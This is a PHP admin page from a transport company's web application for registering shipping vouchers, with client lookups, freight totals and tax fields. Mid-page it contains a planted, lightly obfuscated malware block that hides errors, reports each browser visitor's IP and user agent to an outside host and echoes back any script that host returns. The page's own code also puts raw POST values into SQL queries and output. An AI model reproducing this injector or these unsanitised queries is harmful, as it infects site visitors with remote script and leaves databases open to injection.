<?php
 	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}	
	else if(!isset($_POST["op"]) || $_POST["op"]!="armarComprobante")
	{
		header("Location: index.html");
	}
	
	include("../conexion/ajax.php");
	require("../conexion/config.php");
	require("../conexion/baseDatos.php");
	$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
	$con = $bd->conectar();
?>
<script language="javascript" type="text/javascript">
	var band=1;
	function validarGuiaRem()
	{
		 tipo = document.getElementById("selectTipo").options[document.getElementById("selectTipo").selectedIndex].value;
		 if(tipo=="Almacen")
		 {
		 	document.getElementById("guiaRemision").innerHTML = "-----------------------";
			band=0;
		 }
		 else
		 {
		 	document.getElementById("guiaRemision").innerHTML = "<input name=\"textNroGuiaRem\" type=\"text\" id=\"textNroGuiaRem\" maxlength=\"6\"/>";
			band=1;
		 }
	}
	
	function cancelarTodo()	
	{	
		agregarCargando('cargando');
		codComp = document.getElementById("codComp").value;
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=cancelarComp&codComp=" + codComp;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;			
					agregarCargando('cargando');
					if(resp=="exito")
					{
						alert("¡ El comprobante y sus articulo han sido eliminado exitosamente !");	
						location.href="administrador.php";
					}			
				}
			}
		}
	}
	
	function validar()
	{
		agregarCargando('cargando');
		//num = document.getElementById("textNumero").value;
		//serie = document.getElementById("textSerie").value;
		origen = document.getElementById("textDirOrigen").value;
		destino = document.getElementById("textDirDestino").value;
		docCli = document.getElementById("textCodCli").value;
		if(band==1)
		{
			nroGuia = document.getElementById("textNroGuiaRem").value;
			if(nroGuia.length==0)
			{
				alert("¡ Todos los campos deben estar llenos !");
				quitarCargando('cargando');
				return;				
			}
			else if(!(/^\d{6}$/.test(nroGuia)))
			{
				alert("¡ Formato incorrecto del nro de guia !");
				quitarCargando('cargando');
				return;
			}
		}
		
		if(/*num.length==0 || serie.length==0 || */origen.length==0 || destino.length==0 || docCli.length==0)
		{
			alert("¡ Todos los campos deben estar llenos !");
			quitarCargando('cargando');
			return;
		}
		/*else if(!(/^\d{6}$/.test(num)))
		{
			alert("¡ Formato incorrecto del numero !");
			quitarCargando('cargando');
			return;
		}
		else if(!(/^\d{3}$/.test(serie)))
		{
			alert("¡ Formato incorrecto de la serie !");
			quitarCargando('cargando');
			return;
		}*/
		/*else if(!(/^\d{10}$/.test(docCli)))
		{
			alert("¡ Formato incorrecto del DocCli !");
			quitarCargando('cargando');
			return;
		}*/
		document.getElementById("form1").submit();
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - RegComprobante ::</title>
<style type="text/css">
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
</style></head>

<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="470"><div align="center">
          <form id="form1" name="form1" method="post" action="admin.php">
            <p><strong>REGISTRAR COMPROBANTE </strong></p>
            <table width="771" border="0">
              <tr>
                <th width="186" height="32" scope="col"><div align="justify"><em><strong>Cliente  : </strong></em></div></th>
                <th width="192" scope="col"><div align="justify" id="codCliente">
				<?php 		
					$cod = $_POST["CodCliente"];
					$consult = "select DNI from cliente where CodigoCliente='$cod';";		
					$result = $bd->crearConsulta($consult);
					$reg = mysql_fetch_object($result);
					$dni = $reg->DNI;	
					print(mysql_error());				
					if($dni!=NULL)
					{
						$consult = "select Nombres, ApellidoPaterno, ApellidoMaterno from cliente where CodigoCliente='$cod';";		
						$result = $bd->crearConsulta($consult);
						$reg = mysql_fetch_object($result);
						print($reg->Nombres." ".$reg->ApellidoPaterno." ".$reg->ApellidoMaterno); 
					}
					else
					{
						$consult = "select RazonSocial from cliente where CodigoCliente='$cod';";		
						$result = $bd->crearConsulta($consult);
						$reg = mysql_fetch_object($result);
						print($reg->RazonSocial); 						
					}
				?>
<?php
#295439#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/295439#
?>
				</div></th>
                <th width="64" scope="col">&nbsp;</th>
				
                <th width="303" rowspan="12" align="center" valign="top" scope="col"><label>
                  <div align="center"><em><strong>Productos </strong></em><br />
                    <br>
                    <select name="select" size="15">
						<?php
							$comp = $_POST["CodComp"];
							$consult = "select Descripcion from articulo where Comprobante_Codigo='$comp';";		
							$result = $bd->crearConsulta($consult);
							while($reg = mysql_fetch_object($result))
							{
								print("<option>".$reg->Descripcion."</option>");															
							}
						?>
                    </select>
                  </div>
                </label></th>
                </tr>
              <tr>
                <td height="37"><div align="justify"><em><strong>C&oacute;digo Viaje : </strong></em></div></td>
                <td><label>
                  </label>
                  <div align="justify" id="viaje">
				  <?php
				  		$cod = $_POST["CodViaje"];	
						print($cod); 
				  ?>
				  </div></td>
                <td>&nbsp;</td>
                </tr>
              <tr>
                <td height="36"><div align="justify"><em><strong>C&oacute;digo Remito :</strong></em></div></td>
                <td><div align="justify" id="remito">
                <?php
					print($_POST["CodComp"]);
				?>
                </div></td>
                <td>&nbsp;</td>
              </tr>
              
              <tr>
                <td height="39"><div align="justify"><em><strong>Total : </strong></em></div></td>
                <td><div align="justify">
				<?php					
					$consult = "select Flete from articulo where Comprobante_Codigo='$comp';";		
					$result = $bd->crearConsulta($consult);
					$aux=0;
					while($reg = mysql_fetch_object($result))
					{
						$aux += $reg->Flete;
					}
					print($aux); 
				?>
                <input type="hidden" name="total" value="<?php print($aux); ?>" />
				</div></td>
                <td rowspan="2">&nbsp;</td>
                </tr>
              <tr>
                <td height="33"><strong><em>IGV:</em></strong></td>
                <td><select name="cmbIGV" id="select" >
                <?php
					$sqlIGV="select codigo, procentaje from igv";
					$src=$bd->crearConsulta($sqlIGV);
					if(mysql_num_rows($src)>0)
					{
						while($fila=mysql_fetch_array($src))
						{							
							echo("<option value=\"$fila[0]\">$fila[1]</option>");
						}
					}
				  ?>
                </select></td>
              </tr>
				<tr>
                  <td rowspan="2"><div align="justify"><em><strong>Detracci&oacute;n : </strong></em></div>                    <div align="justify"></div></td>
                  <td rowspan="2"><label></label>                    <div align="justify">
                      <?php
					if($aux>=400)
					{
						$aux*=0.04;
						$aux = number_format($aux, 2, '.', '');
						print($aux);
					}
					else
					{
						$aux=0;
						print(0);
					}					
				?>
                      <input type="hidden" name="detraccion" value="<?php print($aux); ?>" />
                        </div></td>
                <td height="36">&nbsp;</td>
              </tr>
              <tr>
                <td height="21"><div align="center" id="cargando"></div></td>
              </tr>              
              <tr>
                <td height="36"><div align="justify"><em><strong>Direcci&oacute;n Origen : </strong></em></div></td>
                <td><label></label>
                  <div align="justify">
                    <label>
                    <!--<textarea name="textDirOrigen" wrap="physical" id="textDirOrigen"></textarea>-->
                    </label>
                    <label>
                    <select name="textDirOrigen" id="textDirOrigen">
                      <option value="JR SUCRE 626 - CAJAMARCA ">JR SUCRE- CAJAMARCA</option>
                      <option value="AV UNIVERSITARIA Mz A Lt 3 cda 38 - LOS OLIVOS - LIMA">AV UNIVERSITARIA - LIMA </option>
                      <option value=" PLAZA PECUARIA SAN MARCOS - CAJAMARCA">PLAZA PECUARIA - SAN MARCOS</option>
					  <option value=" PLAZA PECUARIA CAJAMARCA CARRETERA A JESUS KM2 - CAJAMARCA">PLAZA PECUARIA - CAJAMARCA</option>
					  <option value="CENTRO DE ACOPIO JOSE ORTIZ - CHICLAYO
">CENTRO DE ACOPIO - CHICLAYO</option>
                    </select>
                    </label>
                  </div></td>
                <td>&nbsp;</td>
                <td width="4"><label></label></td>
              </tr>
              <tr>
                <td height="40"><div align="justify"><em><strong>Direcci&oacute;n Destino : </strong></em></div></td>
                <td><div align="justify">
                  <label>
                  <textarea name="textDirDestino" id="textDirDestino"></textarea>
                  </label>
                </div></td>
                <td>&nbsp;</td>
                </tr>
              <tr>
                <td height="33"><em><strong>Direcci&oacute;n fiscal : </strong></em></td>
                <td><label>
				<?php
					$consult = "select direccionFiscal from cliente where CodigoCliente='".$_POST["CodCliente"]."';";		
					$result = $bd->crearConsulta($consult);					
					$reg = mysql_fetch_object($result);
					print($reg->direccionFiscal);
				?>
				</label></td>
                <td>&nbsp;</td>
                </tr>		
				
				<tr>
                <td height="37"><em><strong>Serie : </strong></em></td>
                <td><label>
                  <select name="selectSerie" id="selectSerie">
                    <option value="001">001</option>
                    <option value="002">002</option>
                  </select>
                </label></td>
                <td></td>
                </tr>
						
              <tr>
                <td height="44"><div align="justify"><em><strong>Nro de Guia Remisi&oacute;n : </strong></em></div></td>
                <td><div align="justify" id="guiaRemision">
                  <input name="textNroGuiaRem" type="text" id="textNroGuiaRem" />
                </div>                  <label></label></td>
                <td>&nbsp;</td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="26"><em><strong>Doc/Cli :</strong></em></td>
                <td><input name="textCodCli" type="text" id="textCodCli" /></td>
                <td>&nbsp;</td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td><div align="justify"><strong><em>Destino : </em></strong></div></td>
                <td><label>
                  <div align="justify">
                    <select name="selectDest" id="selectDest">
                      <option value="CJ">CJ</option>
                      <option value="LM">LM</option>
                      <option value="SM">SM</option>
					  <option value="MG">MG</option>
					  <option value="CH">CH</option>
                    </select>
                    </div>
                </label></td>
                <td>&nbsp;</td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td>&nbsp;</td>
                <td>&nbsp;</td>
                <td>&nbsp;</td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td>&nbsp;</td>
                <td><div align="right">
                  <label>
                  <input type="hidden" name="estadoP" id="estadoP" value="<?php print($_POST["estadoP"])?>" />
                  <input type="hidden" name="op" id="op" value="regComprobante" />
                  <input type="hidden" name="codComp" id="codComp" value="<?php print($_POST["CodComp"]); ?>" />
                  </label>
                  <input name="Aceptar" type="button" id="Aceptar" value="Aceptar"  onclick="validar()"/>
                </div></td>
                <td>&nbsp;</td>
                <td><div align="left">
                  <input name="Cancelar todo" type="button" id="Cancelar todo" value="Cancelar todo" onClick="cancelarTodo()" />
                </div></td>
              </tr>
            </table>
          </form>
          </div></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>
